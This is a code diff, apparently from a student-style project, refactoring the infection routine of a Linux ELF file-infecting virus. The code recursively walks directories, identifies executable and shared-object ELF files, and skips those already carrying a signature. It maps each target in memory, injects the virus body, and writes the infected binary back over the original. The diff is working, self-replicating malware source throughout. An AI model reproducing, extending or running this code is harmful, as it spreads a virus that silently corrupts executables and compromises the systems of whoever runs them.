@@ -24,7 +24,7 @@ void	infect_dir(char *path)
 		{
 			long					bpos;
 			struct linux_dirent		*linux_dir;
-			
+
 			for (bpos = 0; bpos < nread;)
 			{
 				linux_dir = (void *)buffer + bpos;
@@ -50,127 +50,104 @@ void	infect_dir(char *path)
 
 void	choose_infect(char *path)
 {
+	int				ret;
 	struct stat		statbuf;
 
 	syscall_stat(path, &statbuf);
 	if ((statbuf.st_mode & S_IFMT) == S_IFDIR) // is directory
 		infect_dir(path);
 	else if ((statbuf.st_mode & S_IFMT) == S_IFREG) // is file 
-		infect_file(path);
+	{
+		ret = infect_file(path);
+		#ifdef DEBUG
+			if (ret)
+				debug_print_error(ret, path);
+		#endif
+	}
 	#ifdef DEBUG
 	else // is everything else
 		debug_print_file_type(path, _UNKNOW);
 	#endif
 }
 
-void	infect_file(char *file)
+int		infect_file(char *file)
 {
 	int				ret;
 	int				fd;
 	t_elf			elf;
-	void			*header[64];
 
 	fd = syscall_open(file, O_RDWR);
-	if (fd > 0)
+	if (fd < 0)
 	{
 		#ifdef DEBUG
-			debug_print_file_type(file, _FILE);
+			debug_print_file_type(file, _LOCK_W);
 		#endif
-		ret = syscall_read(fd, header, 64);
-		if (ret >= 0)
-		{
-			ret = check_magic_elf(header);
-			if (ret == ET_EXEC || ret == ET_DYN)
-			{
-				ret = 0;
-				elf.filename = file;
-				elf.size = syscall_lseek(fd, (size_t)0, SEEK_END);
-				if (elf.size < 0 ||
-(elf.addr = syscall_mmap(NULL, elf.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
-				{
-					syscall_close(fd);
-					#ifdef DEBUG
-						debug_print_error(0, file);
-					#endif
-					return ;
-				}
-				if (!ft_memmem(elf.addr, elf.size, SIGNATURE, ft_strlen(SIGNATURE)))
-				{
-					if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
-					{
-						syscall_munmap(elf.addr, elf.size);
-						syscall_close(fd);
-						#ifdef DEBUG
-							debug_print_error(ret, file);
-						#endif
-						return ;
-					}
-					int		size_needed = INJECT_SIZE + ((intptr_t)_start - (intptr_t)infect);
-					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
-					char	*new;
-					new = syscall_mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
-					if (!new)
-					{
-						syscall_munmap(elf.addr, elf.size);
-						syscall_close(fd);
-						#ifdef DEBUG
-							debug_print_error(ret, file);
-						#endif
-						return ;
-					}
-					create_infection(new, &elf, nb_zero_to_add);
-					syscall_munmap(elf.addr, elf.size);
-					syscall_close(fd);
-					fd = syscall_open(file, O_TRUNC | O_WRONLY);
-					if (fd < 0)
-					{
-						syscall_munmap(new, elf.size + size_needed + nb_zero_to_add);
-						return ;
-					}
-					syscall_write(fd, new, elf.size + size_needed + nb_zero_to_add);
-					syscall_munmap(new, elf.size + size_needed + nb_zero_to_add);
-					/*
-					int		size_needed = get_size_needed(&elf, virus_elf);
-					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
-					char	*new;
-					new = syscall_mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
-					if (!new)
-					{
-						syscall_munmap(elf.addr, elf.size);
-						syscall_close(fd);
-						#ifdef DEBUG
-							debug_print_error(ret, file);
-						#endif
-						return ;
-					}
-					create_infection(new, &elf, virus_elf, nb_zero_to_add);
-					syscall_munmap(elf.addr, elf.size);
-					syscall_close(fd);
-					fd = syscall_open(file, O_TRUNC | O_WRONLY);
-					if (fd < 0)
-						return ;
-					syscall_write(fd, new, elf.size + size_needed + nb_zero_to_add);
-					syscall_munmap(new, elf.size + size_needed + nb_zero_to_add);
-					*/
-				}
-				#ifdef DEBUG
-				else
-					debug_print_error(ALREADY_INFECTED, file);
-				#endif
-			}
-		}
-		#ifdef DEBUG
-		else
-			debug_print_error(ret, file);
-		#endif
-		syscall_close(fd);
+		return (0);
 	}
 	#ifdef DEBUG
-	else
-		debug_print_file_type(file, _LOCK_W);
+		debug_print_file_type(file, _FILE);
 	#endif
+	elf.filename = file;
+	if (ret = infect_fd(fd, &elf))
+		syscall_close(fd);
+	return (ret);
 }
 
+int			infect_fd(int fd, t_elf *elf)
+{
+	int				ret;
+	void			*header[64];
+
+	ret = syscall_read(fd, header, 64);
+	if (ret < 0)
+		return (ret);
+	ret = check_magic_elf(header);
+	if (ret != ET_EXEC && ret != ET_DYN)
+		return (NOT_ELF);
+	ret = 0;
+	elf->size = syscall_lseek(fd, (size_t)0, SEEK_END);
+	if (elf->size < 0 ||
+(elf->addr = syscall_mmap(NULL, elf->size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+		return (-1000);
+	if (ft_memmem(elf->addr, elf->size, SIGNATURE, ft_strlen(SIGNATURE)))
+	{
+		syscall_munmap(elf->addr, elf->size);
+		return (ALREADY_INFECTED);
+	}
+	if ((ret = init_elf(elf, elf->addr, elf->size)) < 0)
+	{
+		syscall_munmap(elf->addr, elf->size);
+		return (ret);
+	}
+	int		size_needed = INJECT_SIZE + ((intptr_t)_start - (intptr_t)infect);
+	int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
+	char	*new;
+
+	new = syscall_mmap(NULL, elf->size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+	if (!new)
+	{
+		syscall_munmap(elf->addr, elf->size);
+		return (-1000);
+	}
+	create_infection(new, elf, nb_zero_to_add);
+	syscall_munmap(elf->addr, elf->size);
+	syscall_close(fd);
+	ret = write_infection(elf->filename, elf, new, size_needed + nb_zero_to_add);
+	syscall_munmap(new, elf->size + size_needed + nb_zero_to_add);
+	return (ret);
+}
+
+int			write_infection(char *file, t_elf *elf, char *buffer, int size)
+{
+	int		fd;
+
+	fd = syscall_open(file, O_TRUNC | O_WRONLY);
+	if (fd < 0)
+		return (-1000);
+	syscall_write(fd, buffer, elf->size + size);
+	syscall_close(fd);
+	return (0);
+}
 
 int			get_size_needed(t_elf *elf, t_elf *virus_elf)
 {
